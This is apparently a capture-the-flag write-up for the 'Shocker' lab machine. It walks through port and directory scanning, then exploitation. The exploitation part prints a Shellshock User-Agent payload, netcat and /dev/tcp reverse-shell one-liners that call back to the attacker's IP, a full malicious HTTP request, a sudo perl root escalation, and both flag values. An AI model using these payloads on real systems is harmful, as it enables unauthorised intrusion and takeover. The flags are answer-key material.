### IP
`10.10.10.56`

# Recon

### nmap
`nmap -sC -sV 10.10.10.56 -o Shocker.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-24 16:39 EST
Nmap scan report for 10.10.10.56
Host is up (0.079s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds

```
* We have an apache webpage on port 80
	* When we go here, it's just some text sayigng "Don't Bug Me!" along with an image.
	* The source code isn't super interesting either
* Strangely, ssh is running on port 2222

### exiftool
* Just because there was an image, I wanted to see if I could get any interesting context from that
* Download the image by running `wget "http://10.10.10.56/bug.jpg" -O "bug.jpg"`
* Run `exiftool bug.jpg`
```
ExifTool Version Number         : 12.09
File Name                       : bug.jpg
Directory                       : .
File Size                       : 36 kB
File Modification Date/Time     : 2014:09:25 14:16:14-04:00
File Access Date/Time           : 2020:11:24 16:41:57-05:00
File Inode Change Date/Time     : 2020:11:24 16:41:57-05:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
Image Width                     : 820
Image Height                    : 420
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 820x420
Megapixels                      : 0.344

```
* Not super interesting. The file was modified in 2014, so we know this machine is probably pretty old

### gobuster
`gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/common.txt -o gobusterScan.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/24 16:46:16 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/24 16:46:45 Finished
===============================================================
```
* Hm, didn't really get anything accessible.
* However, we did get `/cgi-bin/`,which might be indicative of a shellshock exploit ("Shocker"... get it?)

### gobuster script search
`gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh, py, pl -o gobusterScan.txt` 
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,
[+] Timeout:        10s
===============================================================
2020/11/24 18:07:05 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.sh (Status: 403)
/.hta. (Status: 403)
/.htaccess (Status: 403)
/.htaccess. (Status: 403)
/.htaccess.sh (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd. (Status: 403)
/.htpasswd.sh (Status: 403)
/user.sh (Status: 200)
===============================================================
2020/11/24 18:08:29 Finished
===============================================================
```
* We get a script called `user.sh`
### nikto
`nikto -host 10.10.10.56`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2020-11-24 16:46:46 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8673 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-11-24 16:56:55 (GMT-5) (609 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* That got us very little information




# Exploitation

### Burpsuite
* If we turn on our proxy pointing to localhost and turn intercept on in burpsuite, we can intercept traffic from the website
* Going to `/cgi-bin/user.sh` we can intercept the get request and press `CTRL+R` to send that to the repeater
	* This is where we can edit the request
* In the "User-Agent" section, we can type in some code
* Using the shellshock vulnerability, we can write `() { :;}; /bin/bash -c '<COMMAND HERE>'
* To test out if code execution works, let's send the code `ping 10.10.14.12` and run `tcpdump -i tun0` (replace the ip with yours)
	* When we press "Send" on the repeater, the influx of packets in tcpdump shows us that we're getting pinged

* Now let's get a reverse shell.
* First, set up a listener locally by running `nc -lvnp 8888`
* At first I tried using the code `nc 10.10.14.12 8888 -e /bin/sh`, but it didn't work. 
* After a while, I realized that they probably had a different version of netcat installed or didn't have it at all, so I looked for a solution without that
* To get a reverse shell without netcat, use the code `bin/bash -i >& /dev/tcp/10.10.14.12/8888 0>&1` (replacing the ip with yours)
	* [This](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) website was very useful here.
* This gives us a get request that looks like this in the end:
```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.12/1337 0>&1'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ca;q=0.8
Connection: close

```
* Pressing "Send", we get a reverse shell in our terminal!


* You can `cd /home/shelly` and `cat user.txt` to get the user flag: `96c9a22b1cef9d821835833b14ab404c`

* To privesc, you can run `sudo -l` to see what we can already run as root. We get the following output:
```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
* Here we can see that shelly can run the perl command as sudo without any passwords.
* That's kinda bad, because perl lets people execute commands.
* Running `sudo perl -e "exec '/bin/sh';" gives us a root shell
* Now, we can `cd /root/` and `cat root.txt` to get the root flag: `b46763e9cb93d9b229df1dc0856f0253`

